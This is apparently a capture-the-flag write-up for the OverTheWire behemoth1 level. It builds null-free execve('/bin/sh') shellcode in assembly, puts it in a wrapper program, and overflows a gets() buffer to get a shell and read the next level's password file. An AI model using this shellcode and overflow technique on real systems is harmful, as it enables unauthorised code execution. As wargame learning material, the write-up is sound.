@@ -1,0 +1,319 @@
+First look at the program:
+	____________________________________________________________
+	λ ~/Documents/otw/behemoth/behemoth1/ master* ./behemoth1
+	Password: abcd
+	Authentication failure.
+	Sorry.
+	λ ~/Documents/otw/behemoth/behemoth1/ master*
+	____________________________________________________________
+
+
+	Running behemoth1 prompts you for a 'Password'.
+	No matter what you type in, you get 'Authentication failure'!
+	When you disassemble the program, you will see there is no path to escape failure,
+	it ALWAYS prints that message after input!
+
+	However, this program makes a call to gets.
+
+
+			behemoth1 decompiled:
+	 ___________________________________________________
+	|                       main   	   	            |
+	|    printf("Password: ");	   	     	    |
+	|    char password[67];	    	    	    	    |
+	|    gets(&password);	    	   	     	    |
+	|    puts("Authentication failure.\nSorry.");	    |
+	|    return 0;					    |
+	|___________________________________________________|
+
+	Since this program uses gets, it is an easy target for a buffer overflow.
+
+
+	Although I likely could've used a ret2libc attack or pushed the shellcode onto the stack 
+	(and jumped to the stack pointer) I chose to write a wrapper program to control the environment variables.
+
+Learning about assembly and syscalls:
+
+	I could have used shorter/more effective shellcode,
+	I definitely wanted to give it a try creating my own 32 bit shellcode.
+
+	First, I had to learn about super basic barebones assembly!
+
+	.text used to declare labels for linker, and also holding the actual code
+	.data section holds variables and constants
+
+	EAX is the 32 bit register that is used to determine which syscall to use
+	When EAX holds the number 4, the 'write' syscall is used.
+
+	The paramters are then:
+		EBX: file descriptor (1 is stdout)
+		ECX: the bytes to write
+		EDX: the number of bytes to write from the string
+
+	Calling interrupt 0x80 results in a syscall!
+
+	helloworld.asm
+	_______________________________________________________________________________________________
+	λ ~/Documents/asm/examples/ cat helloworld.asm
+	section .text:
+		global _start		; declare _start for linker
+	_start:
+		mov eax,4		; Write syscall number
+		mov ebx,1		; Stdout parameter for write
+		mov ecx,message		; Move address of 'message' into ecx (string parameter)
+		mov edx,message_length	; Move length of 'message' string into edx (length parameter)
+		int 0x80		; make syscall
+
+		mov eax,1		; Exit syscall number
+		mov ebx,0		; Ebx parameter for exit (exit code)
+		int 0x80		; make syscall
+
+	section .data:
+		message: db "Hello, world!",0xa	; 'message' holds string and 0xa (newline char)
+		message_length equ $-message	; equ $-message gets length of message as int
+	
+	Link/run file:
+	λ ~/Documents/asm/examples/ nasm -f elf helloworld.asm
+	λ ~/Documents/asm/examples/ ld -m elf_i386 -s -o helloworld helloworld.o
+	λ ~/Documents/asm/examples/ ./helloworld
+	Hello, world!
+	λ ~/Documents/asm/examples/
+	_______________________________________________________________________________________________
+
+	Now to create assembly that executes a shell!
+
+	shell2.asm
+	_______________________________________________________________________________________________
+	λ ~/Documents/asm/shell/ cat shell2.asm
+	section .text
+		global _start
+	_start:
+		mov eax, 11     ; execve syscall!
+		mov ebx, shell  ; filename ("/bin/sh")
+		mov ecx, argv   ; argv	(["/bin/sh", 0]
+		mov edx, 0x0    ; env pointer (NULL)
+		int 0x80        ; make syscall (SHELL!)
+
+		mov eax, 1      ; exit syscall
+		mov ebx, 0      ; exit code 0
+		int 0x80        ; make syscall
+
+	section .data
+		shell db '/bin/sh',0x0	; null-terminated string for shell
+		arg0 db '/bin/sh',0x0	; null-terminated string for argv 
+		argv dd arg0, 0		; null-terminated ARGUMENT array, holds arg0
+
+	λ ~/Documents/asm/shell/ nasm -f elf shell2.asm
+	λ ~/Documents/asm/shell/ ld -m elf_i386 -s -o shell2 shell2.o
+	λ ~/Documents/asm/shell/ ./shell2
+	sh-5.0$  < WE GOT A SHELL WOOO
+	_______________________________________________________________________________________________
+
+	As nice as it is that we have an assembly file, there are plenty of null bytes inside of this.
+	This means that we can't use it as shellcode for a C program to execute, because strings
+	stop at null bytes. We also can't use a .data section at all with shellcode! So no variables.
+
+	To show where the null bytes are and why:
+	_______________________________
+		mov eax, 11
+
+	This line generates null bytes as the number 11 (0x0b) only takes up 8 bits, or 1 byte.
+	Moving that into the register eax then leaves 24 bits (32-8) or 3 null bytes in the bin file.
+
+	To solve that, we can just move 11 into the lowest level of the register, which holds only 1 byte of data:
+		
+		mov al, 11
+	_______________________________	
+
+		mov edx, 0x0
+
+	We also can't move 0x0 into EDX, as that uses a null byte directly.
+	
+	For any time we need a 0, we can just xor a register with itself! That automatically 0's it out,
+	and without using a null byte!
+		
+		xor edx, edx
+	_______________________________	
+
+	
+	section .data
+		shell db '/bin/sh',0x0
+		arg0 db '/bin/sh',0x0
+		argv dd arg0, 0
+
+	Now since we don't have a data section, how can we load a string into execve?
+	On top of that, what about the argv array? The solution is to use the stack!
+
+		mov ebp, esp
+		xor eax, eax   
+		push eax
+		push 0x68732f2f 
+		push 0x6e69622f
+
+		lea ecx, [esp]
+
+		xor eax, eax
+		push eax
+		push ecx
+
+	To do that, get a 0 in eax using xor for null-terminating the strings/argv array.
+	Wipe the stack frame by moving esp into ebp.
+	Push eax onto the stack, then push "//sh" in hex, then "/bin" in hex.
+
+	Now the stack looks like:
+		_____________________________________
+		0x3: "/bin"
+		0x2: "//sh"
+		0x1: 0x0
+		_____________________________________
+
+	Since we wiped the stack frame before with 'mov, ebp, esp', the stack pointer register (esp)
+	currently points to the string "/bin//sh" already. So to get the string into ecx, we can use:
+
+		lea ecx, [esp]
+	This loads the address of the data in the stack, putting it into ECX!
+
+	Now for the array!
+	Push another 0 onto the stack, then push ecx onto the stack!
+
+	Since ecx contains the address pointing to "/bin//sh", this acts as a pointer to a pointer.
+	This gives us the argv array.
+
+	Stack:
+		_____________________________________
+		0x5: 0x3
+		0x4: 0x0
+		0x3: "/bin"
+		0x2: "//sh"
+		0x1: 0x0
+		_____________________________________
+
+
+	Lastly, with the stack set up properly, we push the proper arguments into the registers for the 
+	execve syscall:
+	
+		mov al, 11		; syscall for execve
+		mov ebx, [esp]		; esp holds 0x3, the address pointing to "/bin//sh", so ebx now points
+					; to 0x3, which is the address containing "/bin//sh"
+		mov ecx, esp		; move array [0x3 ("/bin/sh"), 0x0] into ecx (argv!)
+		xor edx, edx		; 0 into edx, or null env pointer
+		int 0x80		; Execute syscall!
+
+
+	To put the entire thing together:
+
+	shell.asm
+	____________________________________________________________
+	section .text                   ;code segment
+		global _start           ;declared for linker
+
+	_start:                         ;linker entry point
+		xor eax, eax            ;Wipe all registers with xor
+		xor ebx, ebx
+		xor ecx, ecx
+		xor edx, edx            ;Environment variables, set to NULL
+
+
+		mov ebp, esp
+
+		xor eax, eax            ;these 2 lines push a 0 onto stack to null terminate /bin//sh
+		push eax
+		push 0x68732f2f         ;push //sh
+		push 0x6e69622f         ;push /bin
+
+		lea ecx, [esp]          ;create address
+
+		xor eax, eax
+		push eax
+		push ecx
+
+		mov ebx, [esp]
+		mov ecx, esp
+		mov al, 11              ;execve syscall in eax register
+
+		int 0x80
+
+	λ ~/Documents/asm/shell/ nasm -f elf shell.asm
+	λ ~/Documents/asm/shell/ ld -m elf_i386 -s -o shell shell.o
+	λ ~/Documents/asm/shell/ ./shell
+	sh-5.0$
+	____________________________________________________________
+
+	Ok! Now we should have a shell with no null bytes!
+
+	Lets check with objdump:
+	
+	__________________________________________________________
+	λ ~/Documents/asm/shell/ objdump -d ./shell
+	./shell:     file format elf32-i386
+	Disassembly of section .text:
+
+	08049000 <.text>:
+	 8049000:       31 c0                   xor    %eax,%eax
+	 8049002:       31 db                   xor    %ebx,%ebx
+	 8049004:       31 c9                   xor    %ecx,%ecx
+	 8049006:       31 d2                   xor    %edx,%edx
+	 8049008:       89 e5                   mov    %esp,%ebp
+	 804900a:       31 c0                   xor    %eax,%eax
+	 804900c:       50                      push   %eax
+	 804900d:       68 2f 2f 73 68          push   $0x68732f2f
+	 8049012:       68 2f 62 69 6e          push   $0x6e69622f
+	 8049017:       8d 0c 24                lea    (%esp),%ecx
+	 804901a:       31 c0                   xor    %eax,%eax
+	 804901c:       50                      push   %eax
+	 804901d:       51                      push   %ecx
+	 804901e:       8b 1c 24                mov    (%esp),%ebx
+	 8049021:       89 e1                   mov    %esp,%ecx
+	 8049023:       b0 0b                   mov    $0xb,%al
+	 8049025:       cd 80                   int    $0x80
+	λ ~/Documents/asm/shell/
+	__________________________________________________________
+
+	In the middle section there are no null bytes!
+
+	using 'hexdump -v -e '"\\" 1/1 "x%02x"' shell; echo' we can print out the bytes, and copy them,
+	netting us:
+		"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+		"\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd"
+		"\x80\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74"
+
+	OK! Now we can actually exploit behemoth1 with our shellcode.
+
+Exploiting behemoth1:
+	
+	b1wrapper.c
+	______________________________________________________________________________________________
+	#include <unistd.h>
+
+	int main(void) {
+	    char *environment[2] = {"SHELLCODE=\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50
+	    \x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1
+	    \xb0\x0b\xcd\x80", 0};
+	    char *argv[2] = {"./behemoth1", 0};
+	    execve("./behemoth1", argv, environment);
+	}
+	______________________________________________________________________________________________
+
+
+	The above wrapper program creates a shellcode environment variable (containing the shellcode),
+	and executes behemoth1 so that is the only environment variable in the stack.
+
+	All that's left is to execute the wrapper with an input that makes the return address in the
+	stack of behemoth1 point to our shellcode!
+
+	Since the buffer holds 68 characters, we need 71 bytes + the address of our shellcode.
+	Due to our wrapper program, the stack won't shift even outside of gdb.
+	so we end up with a payload: 
+	'AAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR\xAD\xDR\xES\xS!'
+	
+	all together './b1wrapper < payload' Should work right?
+	Well, it depends.
+	On my 64 bit device, because the initial shell is 64 bit, when it tries to execute /bin//sh it
+	swaps to a 64 bit shell when execve /bin/sh is called... So to fix that we use a technique from
+	narnia0! 
+
+	'(python2 payload.py && cat) | ./behemoth1'
+
+	^ This keeps stdin open (32 bit), and nets a shell!!!!
+	
+	Now we can execute 'cat /etc/behemoth_pass/behemoth2'!
